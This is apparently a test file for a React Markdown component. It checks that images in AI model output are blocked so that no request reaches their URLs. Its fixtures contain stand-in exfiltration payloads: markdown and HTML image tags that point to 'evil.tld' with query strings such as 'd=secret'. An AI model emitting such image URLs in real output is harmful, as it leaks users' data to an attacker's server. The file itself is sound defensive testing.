import { describe, expect, test } from "bun:test";
import { renderToStaticMarkup } from "react-dom/server";
import Markdown, { IMAGE_REMOVED } from "./markdown";

const render = (md: string, components?: Parameters<typeof Markdown>[0]["components"]) =>
  renderToStaticMarkup(
    <Markdown mode="static" controls={false} components={components}>
      {md}
    </Markdown>,
  );

describe("Markdown never loads images from model output", () => {
  test("a markdown image renders as text, with no request to its URL", () => {
    const html = render("Before ![logo](https://evil.tld/x?d=secret) after");
    expect(html).not.toContain("evil.tld");
    expect(html).not.toContain("<img");
    expect(html).not.toContain('rel="preload"');
    expect(html).toContain("[Image blocked: logo]");
    expect(html).toContain("Before");
    expect(html).toContain("after");
  });

  test("raw <img>, <picture>/<source> and data: images are removed too", () => {
    const html = render(
      [
        '<img src="https://evil.tld/a?d=1">',
        "",
        '<picture><source srcset="https://evil.tld/b?d=2"><img src="https://evil.tld/c"></picture>',
        "",
        "![](data:image/png;base64,iVBORw0KGgo=)",
      ].join("\n"),
    );
    expect(html).not.toContain("evil.tld");
    expect(html).not.toContain("data:image");
    expect(html).not.toContain("<img");
    expect(html).not.toContain("<source");
  });

  test("a caller's img override cannot re-enable images", () => {
    const html = render("![x](https://evil.tld/x)", {
      // eslint-disable-next-line @next/next/no-img-element -- the override under test tries to load it
      img: ({ src }) => <img src={typeof src === "string" ? src : ""} alt="" />,
    });
    expect(html).not.toContain("evil.tld");
  });

  test("the override is the placeholder text when an image element reaches it", async () => {
    const { SAFE_IMAGE_COMPONENTS } = await import("./markdown");
    expect(renderToStaticMarkup(<SAFE_IMAGE_COMPONENTS.img />)).toContain(IMAGE_REMOVED);
  });

  test("links still render and still open safely", () => {
    const html = render("See [the guide](https://experteducation.com/guide).");
    expect(html).toContain('href="https://experteducation.com/guide"');
    expect(html).toContain("the guide");
  });
});
